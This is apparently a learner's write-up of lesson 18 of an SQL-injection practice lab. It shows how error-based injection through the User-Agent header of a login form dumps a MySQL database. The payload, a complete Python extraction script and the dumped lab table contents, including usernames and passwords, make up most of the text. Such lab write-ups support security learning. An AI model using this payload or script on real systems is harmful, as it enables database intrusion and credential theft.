# Lesson-18

POST parameter header injection uagent field

If we try known usernames and password it works and gives us that:

```
Your User Agent is: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
```

When we change the user-Agent the printed User Agent also changes

Putting username as `\` gave us an error

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '172.17.0.1', 'Dumb')' at line 1
```

So the query must be like : 

```
INSERT INTO users ('ip','uagent','username') VALUES ('$ip','$uagent','$uname')
```

So we have to use `'` to break the query and it shows errors so we have to get the password through errors

We can use error based injection to dump the database

payload :

```
',(select 1 from(select count(*),concat(0x3a,(select table_name from information_schema.tables where table_schema= database() limit 0,1)"
,0x3a,floor(rand()*2))a from information_schema.tables group by a)b),'');#
```

So I created a script to do the work

```python
import requests

get_table = "(select table_name from information_schema.tables where table_schema= database() limit {0},1)"
get_column = "(select column_name from information_schema.columns where table_name = '{0}' limit {1},1)"
get_secret = "(select {0} from {1} limit {2},1)"
url = "http://localhost:1234/Less-18/"
session = requests.Session()


data={'uname':'dumb','passwd':'dumb'}
payload="',(select 1 from(select count(*),concat(0x3a,{},0x3a,floor(rand()*2))a from information_schema.tables group by a)b),'');#"


for i in range(4):
    find=get_table.format(i)
    header={"User-Agent":payload.format(find)}
    response = requests.post(url,data=data,headers=header)
    while('Subquery returns more than 1 row' in response.text):
        response = requests.post(url,data=data,headers=header)
    temp=response.text[1417:-80]
    table=temp[temp.index(':')+1:temp.rindex(':')]
    column=""

    print("From Table",table,": ")

    for j in range(4):
        find=get_column.format(table,j)
        header={"User-Agent":payload.format(find)}
        response = requests.post(url,data=data,headers=header)

        while('Subquery returns more than 1 row' in response.text):
            response = requests.post(url,data=data,headers=header)
        temp=response.text[1417:-80]

        if(':' in temp):
            column=temp[temp.index(':')+1:temp.rindex(':')]
            content=""

            if(column!='uagent'):
            	print("Column",column," - ",end='')
            	for k in range(10):
	                find=get_secret.format(column,table,k)
	                header={"User-Agent":payload.format(find)}
	                response = requests.post(url,data=data,headers=header)

	                while('Subquery returns more than 1 row' in response.text):
	                	response = requests.post(url,data=data,headers=header)
	                temp=response.text[1417:-80]

	                if(':' in temp):
	                    content=temp[temp.index(':')+1:temp.rindex(':')]
	                    print(content,end=",")
            	print()
```

It gave me:

```
From Table emails : 
Column id  - 1,2,3,4,5,6,7,8,
Column email_id  - Dumb@dhakkan.com,Angel@iloveu.com,Dummy@dhakkan.local,secure@dhakkan.local,stupid@dhakkan.local,superman@dhakkan.local,batman@dhakkan.local,admin@dhakkan.com,
From Table referers : 
Column id  - 
Column referer  - 
Column ip_address  - 
From Table uagents : 
Column id  - 1,2,3,4,5,6,7,8,9,10,
Column ip_address  - 172.17.0.1,1,1,1,1,1,1,1,1,1,
Column username  - Dumb,,,,,,,,,,
From Table users : 
Column id  - 1,2,3,4,5,6,7,8,9,10,
Column username  - Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,
Column password  - dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,
```

